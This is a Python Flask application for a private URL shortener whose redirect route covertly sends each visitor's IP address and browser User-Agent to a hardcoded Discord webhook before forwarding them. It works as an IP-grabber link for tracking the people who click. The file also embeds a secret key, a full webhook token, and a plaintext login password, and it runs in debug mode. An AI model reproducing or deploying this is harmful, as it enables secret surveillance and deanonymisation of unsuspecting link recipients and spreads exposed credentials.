from flask import Flask, request, redirect, jsonify, session, url_for
import json
import string
import random
import requests
import os

app = Flask(__name__)
app.secret_key = '1G5gG9AH0ZcrsXxv1qDW9UvuK1GUTVp3Q9BgtJdsk1Uol1btHc'  # Replace with your own secret key

DATA_FILE = 'data.json'
DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1261170300666646528/mhJM6vLfKt6k0w3EX361vdMHygdobbhQY2u_jMZH7bq1_GxqK23FBfVgcpkgbk6Glm5k'

# Authentication credentials
USERNAME = 'eli32'
PASSWORD = 'eason2830'  # Replace with a secure password

# Ensure the data file exists
if not os.path.exists(DATA_FILE):
    with open(DATA_FILE, 'w') as f:
        json.dump({"urls": {}}, f)

# Function to load data from the JSON file
def load_data():
    with open(DATA_FILE, 'r') as f:
        return json.load(f)

# Function to save data to the JSON file
def save_data(data):
    with open(DATA_FILE, 'w') as f:
        json.dump(data, f, indent=4)

# Function to generate a random string
def generate_short_url():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=6))

# Function to log IP and user agent to Discord
def log_to_discord(ip, user_agent):
    data = {
        "content": f"IP: {ip}\nUser-Agent: {user_agent}"
    }
    response = requests.post(DISCORD_WEBHOOK_URL, json=data)
    if response.status_code != 204:
        print(f"Failed to send webhook: {response.status_code}, {response.text}")

# Login route
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        if username == USERNAME and password == PASSWORD:
            session['logged_in'] = True
            return redirect(url_for('index'))
        return 'Invalid credentials', 401
    return '''
        <form method="post">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
    '''

# Logout route
@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('login'))

# Index route with authentication
@app.route('/', methods=['GET', 'POST'])
def index():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    
    if request.method == 'POST':
        original_url = request.form['original_url']
        short_path = generate_short_url()
        data = load_data()
        data['urls'][short_path] = original_url
        save_data(data)
        return f"Short URL: {request.host_url}{short_path}"
    
    return '''
        <form method="post">
            <input type="url" name="original_url" placeholder="Enter URL" required>
            <button type="submit">Shorten</button>
        </form>
        <a href="/logout">Logout</a>
    '''

@app.route('/<short_path>')
def redirect_url(short_path):
    data = load_data()
    if short_path in data['urls']:
        original_url = data['urls'][short_path]
        ip = request.remote_addr
        user_agent = request.headers.get('User-Agent')
        log_to_discord(ip, user_agent)
        return redirect(original_url)
    return "URL not found", 404

if __name__ == '__main__':
    app.run(debug=True)
